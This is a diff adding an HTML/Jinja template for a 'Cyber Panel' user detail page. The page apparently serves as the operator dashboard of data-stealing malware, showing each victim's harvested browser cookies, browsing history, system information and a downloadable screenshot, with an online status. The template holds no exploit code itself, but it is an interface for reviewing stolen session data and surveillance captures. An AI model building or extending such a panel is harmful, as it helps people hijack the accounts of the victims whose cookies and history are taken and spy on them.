@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User #{{ user.id }} - Cyber Panel</title>
+    <meta name="description" content="Detailed view of user data including cookies, history, and system information">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="min-h-screen bg-cyber-dark">
+        <!-- Background Effects -->
+        <div class="fixed inset-0 overflow-hidden pointer-events-none">
+            <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-neon-cyan/5 rounded-full blur-3xl animate-pulse"></div>
+            <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-neon-green/5 rounded-full blur-3xl animate-pulse" style="animation-delay: 1s;"></div>
+        </div>
+
+        <!-- Header -->
+        <header class="relative z-10 border-b border-cyber-border bg-cyber-card/50 backdrop-blur-sm">
+            <div class="container mx-auto px-6 py-4">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-4">
+                        <a href="/" class="cyber-button">
+                            <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
+                            </svg>
+                            Back to Dashboard
+                        </a>
+                        <div>
+                            <h1 class="text-2xl font-display font-bold gradient-text">User #{{ user.id }}</h1>
+                            <p class="text-cyber-muted text-sm">{{ user.username }} • Last seen: {{ user.timestamp }}</p>
+                        </div>
+                    </div>
+                    <div class="flex items-center gap-4">
+                        {% if user.has_screenshot %}
+                        <span class="flex items-center gap-2 text-neon-green text-sm">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                            </svg>
+                            Screenshot Available
+                        </span>
+                        {% endif %}
+                        <span class="status-online px-3 py-1 rounded-full text-sm font-medium">Online</span>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="relative z-10 container mx-auto px-6 py-8">
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                <!-- Left Column: Data Overview and Tabs -->
+                <div class="lg:col-span-2 space-y-8">
+                    <!-- Data Overview -->
+                    <div class="cyber-card">
+                        <div class="p-6">
+                            <h2 class="text-xl font-display font-bold gradient-text flex items-center gap-2 mb-6">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path>
+                                </svg>
+                                User Data Overview
+                            </h2>
+                            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                                <div class="text-center">
+                                    <div id="cookies-count" class="text-2xl font-display neon-text">-</div>
+                                    <div class="text-sm text-cyber-muted">Cookies</div>
+                                </div>
+                                <div class="text-center">
+                                    <div id="history-count" class="text-2xl font-display neon-text">-</div>
+                                    <div class="text-sm text-cyber-muted">History Items</div>
+                                </div>
+                                <div class="text-center">
+                                    <div class="text-2xl font-display neon-text">#{{ user.id }}</div>
+                                    <div class="text-sm text-cyber-muted">User ID</div>
+                                </div>
+                                <div class="text-center">
+                                    <div id="platform" class="text-2xl font-display neon-text">-</div>
+                                    <div class="text-sm text-cyber-muted">Platform</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Tabs -->
+                    <div class="cyber-card">
+                        <div class="p-6">
+                            <div class="flex space-x-1 bg-cyber-muted/20 p-1 rounded-lg mb-6">
+                                <button class="tab-button active" data-tab="cookies">
+                                    <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                    </svg>
+                                    Cookies
+                                </button>
+                                <button class="tab-button" data-tab="history">
+                                    <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                    </svg>
+                                    History
+                                </button>
+                                <button class="tab-button" data-tab="system">
+                                    <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                    </svg>
+                                    System Info
+                                </button>
+                            </div>
+
+                            <!-- Tab Content -->
+                            <div id="cookies-tab" class="tab-content active">
+                                <h3 class="font-display font-bold mb-4">Browser Cookies</h3>
+                                <div class="max-h-96 overflow-y-auto space-y-3" id="cookies-list">
+                                    <div class="text-center text-cyber-muted py-8">Loading cookies...</div>
+                                </div>
+                            </div>
+
+                            <div id="history-tab" class="tab-content hidden">
+                                <h3 class="font-display font-bold mb-4">Browser History</h3>
+                                <div class="max-h-96 overflow-y-auto space-y-3" id="history-list">
+                                    <div class="text-center text-cyber-muted py-8">Loading history...</div>
+                                </div>
+                            </div>
+
+                            <div id="system-tab" class="tab-content hidden">
+                                <h3 class="font-display font-bold mb-4">System Information</h3>
+                                <div class="space-y-4" id="system-list">
+                                    <div class="text-center text-cyber-muted py-8">Loading system info...</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Column: Screenshot -->
+                <div class="lg:col-span-1">
+                    {% if user.has_screenshot %}
+                    <div class="cyber-card">
+                        <div class="p-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="font-display font-bold gradient-text flex items-center gap-2">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                    </svg>
+                                    Screenshot
+                                </h3>
+                                <div class="flex gap-2">
+                                    <button id="fullscreen-btn" class="cyber-button-sm">
+                                        <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"></path>
+                                        </svg>
+                                        Fullscreen
+                                    </button>
+                                    <a href="/screenshot/{{ user.id }}" download="screenshot-{{ user.id }}.jpg" class="cyber-button-sm">
+                                        <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                                        </svg>
+                                        Download
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="relative">
+                                <img 
+                                    id="screenshot-img" 
+                                    src="/screenshot/{{ user.id }}" 
+                                    alt="User Screenshot" 
+                                    class="w-full rounded-lg shadow-lg cursor-pointer hover:opacity-90 transition-opacity"
+                                    onclick="toggleFullscreen()"
+                                />
+                            </div>
+                        </div>
+                    </div>
+                    {% else %}
+                    <div class="cyber-card">
+                        <div class="p-6">
+                            <h3 class="font-display font-bold gradient-text flex items-center gap-2 mb-4">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                </svg>
+                                Screenshot
+                            </h3>
+                            <div class="aspect-video bg-cyber-muted/30 rounded-lg flex items-center justify-center">
+                                <div class="text-center">
+                                    <svg class="w-12 h-12 mx-auto mb-2 text-cyber-muted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                    </svg>
+                                    <p class="text-cyber-muted">No screenshot available</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    {% endif %}
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Fullscreen Modal -->
+    <div id="fullscreen-modal" class="fixed inset-0 bg-black/90 z-50 hidden items-center justify-center p-4">
+        <div class="relative max-w-full max-h-full">
+            <button id="close-fullscreen" class="absolute top-4 right-4 z-10 cyber-button">
+                Close
+            </button>
+            <img id="fullscreen-image" src="" alt="Screenshot" class="max-w-full max-h-full object-contain rounded-lg">
+        </div>
+    </div>
+
+    <script>
+        const userId = {{ user.id }};
+    </script>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
